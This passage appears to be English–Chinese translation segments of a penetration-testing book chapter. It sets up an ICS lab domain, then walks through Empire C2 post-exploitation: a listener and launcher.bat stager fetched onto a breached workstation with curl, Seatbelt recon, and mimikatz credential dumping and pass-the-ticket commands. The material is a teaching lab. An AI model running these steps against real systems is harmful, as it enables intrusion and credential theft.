- en: Figure 11.26 – Computer Name/Domain Changes
  id: totrans-116
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 11.26 – 计算机名称/域更改
- en: Now, let's make sure that we are domain-connected and can authenticate with
    a known user. As shown in the following screenshot, we have used **operator1**
    to log into the Windows 7 VM:![Figure 11.27 – Domain-connected
  id: totrans-117
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 现在，让我们确保我们已连接到域，并且可以使用已知用户进行身份验证。如以下截图所示，我们已使用 **operator1** 登录到 Windows 7 虚拟机：![图
    11.27 – 域连接
- en: '](image/B16321_11_027.jpg)'
  id: totrans-118
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '](image/B16321_11_027.jpg)'
- en: Figure 11.27 – Domain-connected
  id: totrans-119
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 11.27 – 域连接
- en: 'We need to make sure that our lab operators can use **Remote Desktop** by adding
    **LABCORP\Domain Users** to **Remote Desktop Users**, as shown here:'
  id: totrans-120
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 我们需要确保实验室操作员可以通过将 **LABCORP\Domain Users** 添加到 **远程桌面用户**，如图所示，来使用 **远程桌面**：
- en: '![Figure 11.28 – Domain users as Remote Desktop Users'
  id: totrans-121
  prefs: []
  type: TYPE_NORMAL
  zh: '![图 11.28 – 域用户作为远程桌面用户'
- en: '](image/B16321_11_028.jpg)'
  id: totrans-122
  prefs: []
  type: TYPE_NORMAL
  zh: '](image/B16321_11_028.jpg)'
- en: Figure 11.28 – Domain users as Remote Desktop Users
  id: totrans-123
  prefs: []
  type: TYPE_NORMAL
  zh: 图 11.28 – 域用户作为远程桌面用户
- en: In this section, we configured a firewall to introduce segmentation between
    the enterprise network and the operations network. We also quickly connected the
    Windows 7 VM that we installed in [*Chapter 1*](B16321_01_Epub_AM.xhtml#_idTextAnchor013),
    *Using Virtualization*, to the domain that we created in [*Chapter 10*](B16321_10_Epub_AM.xhtml#_idTextAnchor112),
    *I Can Do It 420*, and made sure that the **LABCORP** users have remote desktop
    access to their operator workstation. In the next section, we will learn how to
    leverage these configurations to discover paths through the network.
  id: totrans-124
  prefs: []
  type: TYPE_NORMAL
  zh: 在本节中，我们配置了一个防火墙，以便在企业网络和操作网络之间引入隔离。我们还快速将我们在 [*第 1 章*](B16321_01_Epub_AM.xhtml#_idTextAnchor013)
    中安装的 Windows 7 虚拟机，*使用虚拟化*，连接到我们在 [*第 10 章*](B16321_10_Epub_AM.xhtml#_idTextAnchor112)
    中创建的域，*I Can Do It 420*，并确保 **LABCORP** 用户可以远程桌面访问他们的操作员工作站。在接下来的章节中，我们将学习如何利用这些配置来发现网络中的路径。
- en: I have a shell, now what?
  id: totrans-125
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 我有一个 shell，现在该怎么办？
- en: It's time to go back to our scheduled broadcast. Once we have gained access,
    watching that shell as it pops up in front of our eyes is exhilarating. However,
    the hard work has yet to come. Next, we need to understand where we have landed
    and what we have access to. For this, we are going to explore a post-exploitation
    framework called **Empire**. Empire is a C2 framework that's used to install PowerShell
    agents that can deliver modules on demand. These modules contain a lot of packages
    that I have come to use over the years, so it is very nice to have them centralized.
    Empire provides modules such as winPEAS, Sherlock, Watson, PowerUp, mimikatz,
    and more. These tools help automate data collection on the system and environment
    that we have landed in and helps us establish a beachhead for our pentesting adventures.
  id: totrans-126
  prefs: []
  type: TYPE_NORMAL
  zh: 现在是时候回到我们计划的广播任务了。一旦我们获得访问权限，看到那个Shell在我们眼前弹出来的瞬间，真是令人激动。然而，艰苦的工作还没有开始。接下来，我们需要了解我们已经进入的环境以及我们能够访问的内容。为此，我们将探索一个叫做**Empire**的后期利用框架。Empire是一个C2框架，用于安装PowerShell代理，可以按需传送模块。这些模块包含了我多年来使用的许多工具，因此将它们集中在一起非常方便。Empire提供了像winPEAS、Sherlock、Watson、PowerUp、mimikatz等模块。这些工具有助于自动化数据收集，了解我们所处的系统和环境，并帮助我们为渗透测试奠定一个立足点。
- en: 'In this section, we are going to quickly install Empire, create a listener,
    build a stager, and then deliver modules to our host. Let''s get started:'
  id: totrans-127
  prefs: []
  type: TYPE_NORMAL
  zh: 在这一部分，我们将快速安装Empire，创建一个监听器，构建一个启动器，然后将模块传送到我们的主机。让我们开始吧：
- en: 'First, we want to clone this GitHub repository and run the **install** script:'
  id: totrans-128
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 首先，我们需要克隆这个GitHub仓库并运行**install**脚本：
- en: '**git clone --recursive https://github.com/BC-SECURITY/Empire.git**'
  id: totrans-129
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '**git clone --recursive https://github.com/BC-SECURITY/Empire.git**'
- en: '**cd Empire**'
  id: totrans-130
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '**cd Empire**'
- en: '**sudo ./setup/install.sh**'
  id: totrans-131
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '**sudo ./setup/install.sh**'
- en: Once the installation has finished, we must run the**./empire** command. Once
    you've done this, you will see a splash page section that shows the total number
    of modules, the number of listeners, and the number of agents currently active
    in the version of the tool that you've installed. In my case, as shown in the
    following screenshot, I have **319** modules available for post-exploitation,
    and **0** listeners and **0** agents running as this is the first time I have
    run Empire before the engagement:![Figure 11.29 – Empire
  id: totrans-132
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 安装完成后，我们必须运行**./empire**命令。完成此操作后，你将看到一个启动页面，显示你安装的工具版本中的模块总数、监听器数量以及当前活动的代理数量。以我的情况为例，如下图所示，我有**319**个可用于后期利用的模块，且没有监听器和代理正在运行，因为这是我第一次运行Empire：![图
    11.29 – Empire
- en: '](image/B16321_11_029.jpg)'
  id: totrans-133
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '](image/B16321_11_029.jpg)'
- en: Figure 11.29 – Empire
  id: totrans-134
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 11.29 – Empire
- en: Next, we want to set up a listener for our soon-to-be deployed agents to report
    back to. In this case, at the **(Empire**) **>** prompt, we can run the **uselistener**
    command, and then add a space and press *Tab* to see the available options that
    we can use. I am going to select **http** in this case for my listener. After
    that, you can type **info** to bring up a list of commands, as shown in the following
    screenshot:![Figure 11.30 – uselistener http
  id: totrans-135
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 接下来，我们需要为即将部署的代理设置一个监听器，以便它们能报告回来。在这种情况下，在**(Empire)** **>** 提示符下，我们可以运行**uselistener**命令，然后按空格键和*Tab*键查看可以使用的选项。我将在这里选择**http**作为我的监听器。之后，你可以输入**info**来列出可用的命令，如下图所示：![图
    11.30 – uselistener http
- en: '](image/B16321_11_030.jpg)'
  id: totrans-136
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '](image/B16321_11_030.jpg)'
- en: Figure 11.30 – uselistener http
  id: totrans-137
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 11.30 – uselistener http
- en: Here, you can fine-tune your listener. In my case, I only changed the **Name**
    and **Host** options. I set **Host** to my Kali Linux IP address, which is **172.16.0.6**
  id: totrans-138
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 在这里，你可以微调你的监听器。在我的情况下，我只更改了**Name**和**Host**选项。我将**Host**设置为我的Kali Linux IP地址，即**172.16.0.6**
- en: Next, we want to create a stager that can be installed on our *victim* machine.
    We are going to use the **(Empire) > usestager multi/launcher http** command for
    this. This command sets the stager to multi/launcher and attaches it to the listener
    that we created in the previous step. When you type **info**, you will be presented
    with options that you can change and tune for your agent delivery mechanism.
  id: totrans-139
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 接下来，我们要创建一个可以安装在*受害者*机器上的启动器。我们将使用**(Empire) > usestager multi/launcher http**命令来实现。这个命令将启动器设置为multi/launcher，并将其附加到我们在上一步创建的监听器上。当你输入**info**时，你将看到可以更改和调整的选项，用于优化你的代理传输机制。
- en: 'Here, if you simply type **generate**, the default option will be to print
    to the screen. This allows you to copy and paste the shellcode into your victim''s
    system. Or, if you are lazy like I am, you can set the **OutFile** option to have
    Empire generate a **.bat** file that you can pass into your victim. Here is the
    output from running **generate** without setting the file:'
  id: totrans-140
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 在这里，如果你只输入**generate**，默认选项是将结果打印到屏幕上。这允许你将shellcode复制并粘贴到受害者的系统中。或者，如果你像我一样懒惰，你可以将**OutFile**选项设置为让Empire生成一个**.bat**文件，直接交给受害者。以下是运行**generate**而没有设置文件时的输出：
- en: '![Figure 11.31 – Stager shellcode'
  id: totrans-141
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '![图11.31 – Stager shellcode'
- en: '](image/B16321_11_031.jpg)'
  id: totrans-142
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '](image/B16321_11_031.jpg)'
- en: Figure 11.31 – Stager shellcode
  id: totrans-143
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图11.31 – Stager shellcode
- en: Now, if you want to set the file option so that you can simply copy it to various
    systems that we wish to compromise, use the **set OutFile launcher.bat** command,
    type **info**, and press *Enter*. You will see that the **OutFile** option now
    has **launcher.bat** as a **Value** field, as shown here:![Figure 11.32 – OutFile
    setting
  id: totrans-144
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 现在，如果你想设置文件选项，以便将其简单地复制到我们希望攻陷的各种系统上，使用**set OutFile launcher.bat**命令，输入**info**并按下*Enter*。你会看到**OutFile**选项现在已将**launcher.bat**设置为**Value**字段，如下所示：![图11.32
    – OutFile设置
- en: '](image/B16321_11_032.jpg)'
  id: totrans-145
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '](image/B16321_11_032.jpg)'
- en: Figure 11.32 – OutFile setting
  id: totrans-146
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图11.32 – OutFile设置
- en: 'After setting your file type to **generate** and pressing *Enter*, if everything
    is correct, you should get the following output:'
  id: totrans-147
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 设置文件类型为**generate**并按下*Enter*后，如果一切正常，你应该会看到如下输出：
- en: '![Figure 11.33 – generate'
  id: totrans-148
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '![图11.33 – 生成'
- en: '](image/B16321_11_033.jpg)'
  id: totrans-149
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '](image/B16321_11_033.jpg)'
- en: Figure 11.33 – generate
  id: totrans-150
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图11.33 – 生成
- en: Now, we are going to upload our newly created **launcher.bat** file to the workstation
    machine that we previously breached and run the file. I will leave it up to you
    to get into the workstation – I used Evil-WinRM to create a session with the **operator2**
    credentials we discovered and then created a **python3 -m http.server** to host
    my **launcher.bat** file. Finally, I used **curl** to grab the file and pull it
    into the workstation, as shown here:![Figure 11.34 – launcher.bat on the workstation
  id: totrans-151
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 现在，我们要将新创建的**launcher.bat**文件上传到之前被攻破的工作站并运行该文件。上传到工作站的过程我留给你来完成——我使用Evil-WinRM通过我们发现的**operator2**凭据创建了一个会话，然后创建了一个**python3
    -m http.server**来托管我的**launcher.bat**文件。最后，我使用**curl**抓取该文件并将其传输到工作站，如下图所示：![图11.34
    – 工作站上的launcher.bat
- en: '](image/B16321_11_034.jpg)'
  id: totrans-152
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '](image/B16321_11_034.jpg)'
- en: Figure 11.34 – launcher.bat on the workstation
  id: totrans-153
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图11.34 – 工作站上的launcher.bat
- en: Once you've run the file, go back to your **(Empire) >** interface and type
    the **agents** command. This will bring up a list of active agents that are available
    to you, as shown in the following screenshot:![Figure 11.35 – Active agents
  id: totrans-154
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 运行完文件后，回到你的**(Empire) >**界面并输入**agents**命令。这将列出可用的活跃代理，如下截图所示：![图11.35 – 活跃代理
- en: '](image/B16321_11_035.jpg)'
  id: totrans-155
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '](image/B16321_11_035.jpg)'
- en: Figure 11.35 – Active agents
  id: totrans-156
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图11.35 – 活跃代理
- en: At this point, we have a live agent that is beaconing back to our Empire C2
    platform – this is awesome! The next step is to type **interact <agent name>**.
    In my case, it will be **interact 62FRNKHT**. After connecting, type **info**
    to see what options can be configured. The following is the output I received:![Figure
    11.36 – Interacting with the agent
  id: totrans-157
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 此时，我们已经有了一个正在回传信号到我们Empire C2平台的活跃代理——太棒了！接下来的步骤是输入**interact <代理名>**。在我的例子中，应该是**interact
    62FRNKHT**。连接后，输入**info**查看可以配置的选项。以下是我收到的输出：![图11.36 – 与代理交互
- en: '](image/B16321_11_036.jpg)'
  id: totrans-158
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '](image/B16321_11_036.jpg)'
- en: Figure 11.36 – Interacting with the agent
  id: totrans-159
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图11.36 – 与代理交互
- en: 'Excellent! At this point, we are interacting with our agent. Let''s start taking
    a look at our system and its surroundings. Typing the **usemodule** command and
    pressing *Tab* will bring up a long list of modules that we have access to. There
    are 12 primary categories, and they contain various submodules. Here are the categories:'
  id: totrans-160
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 太棒了！此时，我们已经与我们的代理进行交互。现在，让我们开始查看我们的系统及其周围环境。输入**usemodule**命令并按*Tab*键，会显示我们可以访问的模块长列表。这里有12个主要类别，每个类别下有多个子模块。以下是这些类别：
- en: '- **code_execution**'
  id: totrans-161
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '- **code_execution**'
- en: '- **collection**'
  id: totrans-162
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '- **collection**'
- en: '- **credentials**'
  id: totrans-163
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '- **credentials**'
- en: '- **exfiltration**'
  id: totrans-164
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '- **exfiltration**'
- en: '- **exploitation**'
  id: totrans-165
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '- **exploitation**'
- en: '- **lateral_movement**'
  id: totrans-166
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '- **lateral_movement**'
- en: '- **management**'
  id: totrans-167
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '- **management**'
- en: '- **persistence**'
  id: totrans-168
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '- **persistence**'
- en: '- **privesc**'
  id: totrans-169
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '- **privesc**'
- en: '- **recon**'
  id: totrans-170
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '- **recon**'
- en: '- **situational_awareness**'
  id: totrans-171
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '- **situational_awareness**'
- en: '- **trollsploit**'
  id: totrans-172
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '- **trollsploit**'
- en: 'Take a look at the various categories and what submodules they have to offer.
    As we mentioned earlier, we want to gather some situational awareness. For this,
    we will use the **situational_awareness** category. From here, select **host**
    and the **Seatbelt** module. To find out more about Seatbelt and its extensive
    capabilities, take a look at the following link: [https://github.com/GhostPack/Seatbelt](https://github.com/GhostPack/Seatbelt).'
  id: totrans-173
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 查看各个类别及其子模块的内容。如前所述，我们希望收集一些情境意识信息。为此，我们将使用**situational_awareness**类别。在这里，选择**host**和**Seatbelt**模块。要了解有关Seatbelt及其强大功能的更多信息，请访问以下链接：[https://github.com/GhostPack/Seatbelt](https://github.com/GhostPack/Seatbelt)。
- en: 'Use the **usemodule situational_awareness/host/seatbelt** command once you
    have set your module type to **info** to take a look at the available options.
    Then, **run** the module – you should get the following output:'
  id: totrans-174
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 一旦你将模块类型设置为**info**，使用**usemodule situational_awareness/host/seatbelt**命令查看可用选项。然后，**运行**该模块
    – 你应该会看到如下输出：
- en: '![Figure 11.37 – The Seatbelt module'
  id: totrans-175
  prefs: []
  type: TYPE_NORMAL
  zh: '![图11.37 – Seatbelt模块'
- en: '](image/B16321_11_037.jpg)'
  id: totrans-176
  prefs: []
  type: TYPE_NORMAL
  zh: '](image/B16321_11_037.jpg)'
- en: Figure 11.37 – The Seatbelt module
  id: totrans-177
  prefs: []
  type: TYPE_NORMAL
  zh: 图11.37 – Seatbelt模块
- en: 'Empire assigns a task ID to the running module, which allows sequencing to
    occur at the agent level. Once the module runs, you will see feedback from the
    agent, and it will be displayed on the screen. As Seatbelt runs, various tests
    will be performed on the workstation and a mass amount of information will be
    harvested, which can easily fill up the visual buffer. You can find an **agent.log**
    that contains the output of tests that have been run by the agent under **Empire/downloads/<agent
    name>/agent.log**. Upon reviewing this log file, you can find interesting information
    about the host system that the agent resides on. You will discover various interfaces
    being utilized, antivirus software, AppLocker, autorun programs, environment variables,
    interesting files, interesting processes, and much more. The following screenshot
    shows a list of users with administrative privileges on workstation 1, which was
    discovered through one of the tests:'
  id: totrans-178
  prefs: []
  type: TYPE_NORMAL
  zh: Empire为正在运行的模块分配一个任务ID，从而使代理级别的序列化得以进行。模块运行后，你将看到来自代理的反馈，并且会在屏幕上显示。当Seatbelt运行时，它将在工作站上执行各种测试，并收集大量信息，这些信息可以轻松填满视觉缓冲区。你可以在**Empire/downloads/<agent
    name>/agent.log**下找到包含代理执行的测试输出的**agent.log**文件。查看此日志文件时，你会发现有关代理所在主机系统的有趣信息。你将发现正在使用的各种接口、杀毒软件、AppLocker、自动运行程序、环境变量、有趣的文件、有趣的进程等等。以下截图显示了工作站1上具有管理员权限的用户列表，这是通过其中一个测试发现的：
- en: '![Figure 11.38 – Admin privileges'
  id: totrans-179
  prefs: []
  type: TYPE_NORMAL
  zh: '![图11.38 – 管理员权限'
- en: '](image/B16321_11_038.jpg)'
  id: totrans-180
  prefs: []
  type: TYPE_NORMAL
  zh: '](image/B16321_11_038.jpg)'
- en: Figure 11.38 – Admin privileges
  id: totrans-181
  prefs: []
  type: TYPE_NORMAL
  zh: 图11.38 – 管理员权限
- en: 'Another test is discovering current RDP sessions that are present on the host,
    which we can do by reading through the log file with the username set to **lab.da**,
    as shown here:'
  id: totrans-182
  prefs: []
  type: TYPE_NORMAL
  zh: 另一个测试是发现主机上当前存在的RDP会话，我们可以通过查看用户名设置为**lab.da**的日志文件来实现，如下所示：
- en: '![Figure 11.39 – RDP sessions'
  id: totrans-183
  prefs: []
  type: TYPE_NORMAL
  zh: '![图11.39 – RDP会话'
- en: '](image/B16321_11_039.jpg)'
  id: totrans-184
  prefs: []
  type: TYPE_NORMAL
  zh: '](image/B16321_11_039.jpg)'
- en: Figure 11.39 – RDP sessions
  id: totrans-185
  prefs: []
  type: TYPE_NORMAL
  zh: 图11.39 – RDP会话
- en: These are simply snippets of the information that has been gleaned from the
    tests that Seatbelt performs. However, as you search through the log file, you
    will find that **Operator2** does not have administrative access, and this proves
    to be an issue when gleaning more detailed information. This moves us nicely to
    the next section, where we will discover how to elevate our privileges to gain
    deeper insights into our victim machine.
  id: totrans-186
  prefs: []
  type: TYPE_NORMAL
  zh: 这些仅仅是从Seatbelt执行的测试中获取的信息片段。然而，当你浏览日志文件时，你会发现**Operator2**没有管理员访问权限，这在获取更详细信息时成为一个问题。这将自然引导我们进入下一节，我们将发现如何提升我们的权限，以深入了解我们的受害机器。
- en: Escalating privileges
  id: totrans-187
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 提升权限
- en: 'Privilege escalation is where an attacker looks to gain access that extends
    beyond the scope of the exploited user''s ability. There are two forms: **horizontal**
    privilege escalation and **vertical** privilege escalation. Horizontal privilege
    escalation is a term that''s used for maintaining a current user''s privileges
    while leveraging flaws in system policies, software, and file settings, which
    allows the current user to access other user resources, files, and services. This
    type of privilege access is commonplace in industrial control systems and in my
    experience, it can be enough to bring systems and processes to a grinding halt.
    Vertical privilege escalation, on the other hand, is the attacker''s journey,
    whereby they move from a less privileged account through to a system admin or
    a domain admin account. Once an attacker has a domain admin account, they can
    wreak havoc inside of the compromised network and infrastructure.'
  id: totrans-188
  prefs: []
  type: TYPE_NORMAL
  zh: 特权提升是攻击者试图获得超出被攻击用户权限范围的访问权限。特权提升有两种形式：**水平**特权提升和**垂直**特权提升。水平特权提升是指在保持当前用户权限的同时，利用系统策略、软件和文件设置中的漏洞，使当前用户能够访问其他用户的资源、文件和服务。这种类型的特权访问在工业控制系统中很常见，根据我的经验，它足以使系统和进程陷入停滞。另一方面，垂直特权提升是攻击者的过程，他们通过从权限较低的账户逐步提升到系统管理员或域管理员账户。一旦攻击者拥有了域管理员账户，他们就能在被攻陷的网络和基础设施中肆意破坏。
- en: 'In the previous section, we installed Empire, which allowed us to run post-exploitation
    recon and situational awareness. We are going to leverage the same C2 engine to
    run the **privesc** modules. For this, we are going to install our **launcher.bat**
    file; that is, **operator1**:'
  id: totrans-189
  prefs: []
  type: TYPE_NORMAL
  zh: 在前一节中，我们安装了Empire，这使我们能够执行后期利用侦查和态势感知。我们将利用相同的C2引擎来运行**privesc**模块。为此，我们将安装我们的**launcher.bat**文件，也就是**operator1**：
- en: As you may recall from [*Chapter 10*](B16321_10_Epub_AM.xhtml#_idTextAnchor112),
    *I Can Do It 420*, we discovered the NTLM hash of **operator1** NTLM hash and
    we used hashcat to crack it. Once you run **launcher.bat** under **operator1**,
    go back to Empire and look at its list agents. You should now see that two agents
    have been installed, as shown here:![Figure 11.40 – Installing the operator1 agent
  id: totrans-190
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 正如你在[*第10章*](B16321_10_Epub_AM.xhtml#_idTextAnchor112)中回忆到的，*I Can Do It 420*，我们发现了**operator1**的NTLM哈希，并使用hashcat破解了它。一旦你在**operator1**下运行**launcher.bat**，返回Empire并查看其代理列表。你现在应该看到两个代理已安装，如下所示：![图
    11.40 – 安装operator1代理
- en: '](image/B16321_11_040.jpg)'
  id: totrans-191
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '](image/B16321_11_040.jpg)'
- en: Figure 11.40 – Installing the operator1 agent
  id: totrans-192
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 11.40 – 安装operator1代理
- en: Next, we will interact with our new agent by using the **interact <agent name>**
    command. In my case, the command will be **interact 1PKZ7G3T**. As we saw in the
    previous section, there are many modules that we can use to perform various tests
    and attacks. To start, we can use the **credentials/mimikatz/command** module,
    which allows us to change the command and continue running **mimikatz**. Mimikatz
    is a legendary tool that's used to dump system credentials. To learn more about
    it, go to [https://github.com/gentilkiwi/mimikatz](https://github.com/gentilkiwi/mimikatz).
    We will be using mimikatz to dump credentials and tickets. Then, using these tickets,
    we will run a **pass-the-ticket** (**PTT**) attack. A PTT attack works by dumping
    Kerberos tickets from the **Local Security Authority Subsystem Service** (**LSASS**)
    memory.
  id: totrans-193
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 接下来，我们将通过使用**interact <agent name>**命令与新代理进行交互。在我的例子中，命令将是**interact 1PKZ7G3T**。正如我们在前一节中看到的，系统中有许多模块可以用来执行各种测试和攻击。首先，我们可以使用**credentials/mimikatz/command**模块，它允许我们更改命令并继续运行**mimikatz**。Mimikatz是一款传奇工具，用于转储系统凭证。要了解更多信息，请访问[https://github.com/gentilkiwi/mimikatz](https://github.com/gentilkiwi/mimikatz)。我们将使用mimikatz来转储凭证和票据。然后，利用这些票据，我们将执行**pass-the-ticket**（**PTT**）攻击。PTT攻击的原理是从**本地安全授权子系统服务**（**LSASS**）的内存中转储Kerberos票据。
- en: Use the **set Command sekurlsa::logonPasswords** command and then type **run**.
    You should see the following output:![Figure 11.41 – sekurlsa logonPasswords
  id: totrans-194
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 使用**set Command sekurlsa::logonPasswords**命令，然后输入**run**。你应该会看到以下输出：![图 11.41
    – sekurlsa logonPasswords
- en: '](image/B16321_11_041.jpg)'
  id: totrans-195
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '](image/B16321_11_041.jpg)'
- en: Figure 11.41 – sekurlsa logonPasswords
  id: totrans-196
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 11.41 – sekurlsa logonPasswords
- en: Once the module has finished running, type **creds** and press *Enter*. You
    will see the credentials that have been captured; these will be stored automatically
    by Empire. Using the **creds** storage side of Empire is a key feature that will
    help immensely with your pentesting engagement. You can view the credentials that
    were discovered by running the **logonPasswords** command:![Figure 11.42 – Credentials
  id: totrans-197
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 一旦模块运行完成，输入**creds**并按*Enter*键。你将看到已经捕获的凭据，这些凭据会被Empire自动存储。使用Empire的**creds**存储功能是一个关键特性，它将在渗透测试中为你提供极大的帮助。你可以通过运行**logonPasswords**命令查看被发现的凭据：![图
    11.42 – 凭据
- en: '](image/B16321_11_042.jpg)'
  id: totrans-198
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '](image/B16321_11_042.jpg)'
- en: Figure 11.42 – Credentials
  id: totrans-199
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 11.42 – 凭据
- en: With that, you have seen how easy it is to dump credentials. Now, we will learn
    how easy it is to use mimikatz to dump tickets. We are going to set the **Command**
    option to **sekurlsa::tickets /export** and then type the command **run**. The
    **/export** object tells the module to export tickets as **.kirbi** files. We
    can then use these tickets to perform more advanced attacks such as PTT. A Golden
    Ticket is a reference to a ticket that grants a user domain admin access. Kerberos
    is widely used, which makes it an excellent attack surface and because it is so
    widely used, attackers have found ways to exploit it. So, to take a look at how
    easy it is to capture tickets, we will set **Command** to **sekurlsa::tickets
    /export** for the **mimikatz** module and then run it. You should see the following
    output:![Figure 11.43 – sekurlsa::tickets
  id: totrans-200
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 这样，你就看到了如何轻松地转储凭据。现在，我们将学习如何轻松地使用mimikatz转储票证。我们将设置**Command**选项为**sekurlsa::tickets
    /export**，然后输入**run**命令。**/export**对象告诉模块将票证导出为**.kirbi**文件。然后，我们可以使用这些票证执行更高级的攻击，如PTT。Golden
    Ticket是指授予用户域管理员权限的票证。Kerberos被广泛使用，这使它成为一个极好的攻击面，并且由于它的广泛使用，攻击者已找到利用它的方法。所以，为了看看捕获票证有多简单，我们将**Command**设置为**sekurlsa::tickets
    /export**，并运行它。你应该会看到以下输出：![图 11.43 – sekurlsa::tickets
- en: '](image/B16321_11_043.jpg)'
  id: totrans-201
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '](image/B16321_11_043.jpg)'
- en: Figure 11.43 – sekurlsa::tickets
  id: totrans-202
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 11.43 – sekurlsa::tickets
- en: On our victim host, you will be able to find the **.kirbi** tickets that were
    exported from running the **sekurlsa::tickets /export** command, as shown here:![Figure
    11.44 – .kirbi tickets
  id: totrans-203
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 在我们的受害者主机上，你将能够找到从运行**sekurlsa::tickets /export**命令导出的**.kirbi**票证，如下所示：![图
    11.44 – .kirbi 票证
- en: '](image/B16321_11_044.jpg)'
  id: totrans-204
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '](image/B16321_11_044.jpg)'
- en: Figure 11.44 – .kirbi tickets
  id: totrans-205
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 11.44 – .kirbi 票证
- en: Now that we have **.kirbi** tickets, we can utilize **mimikatz.exe** on our
    victim machine and use the **kerberos::ptt <ticket>** command, as shown here:![Figure
    11.45 – kerberos::ptt – pass the ticket
  id: totrans-206
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 现在我们有了**.kirbi**票证，我们可以在受害者机器上使用**mimikatz.exe**并使用**kerberos::ptt <ticket>**命令，如下所示：![图
    11.45 – kerberos::ptt – 传递票证
- en: '](image/B16321_11_045.jpg)'
  id: totrans-207
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '](image/B16321_11_045.jpg)'
- en: Figure 11.45 – kerberos::ptt – pass the ticket
  id: totrans-208
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 11.45 – kerberos::ptt – 传递票证
- en: Now, we can verify that PTT worked by running the **klist** command. This will
    list the cached tickets on the system, which will let us see if we have successfully
    impersonated the ticket:![Figure 11.46 – Cached tickets
  id: totrans-209
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 现在，我们可以通过运行**klist**命令验证PTT是否成功。这将列出系统上缓存的票证，让我们能够看到是否成功模拟了该票证：![图 11.46 – 缓存票证
- en: '](image/B16321_11_046.jpg)'
  id: totrans-210
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '](image/B16321_11_046.jpg)'
- en: Figure 11.46 – Cached tickets
  id: totrans-211
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 11.46 – 缓存票证
- en: 'Next, we are going to run a module that will perform automatic testing to help
    find a path to exploit. We will be using the WinPEAS module, which can be found
    under the **privesc** category. **Windows Privilege Escalation Awesome Scripts**
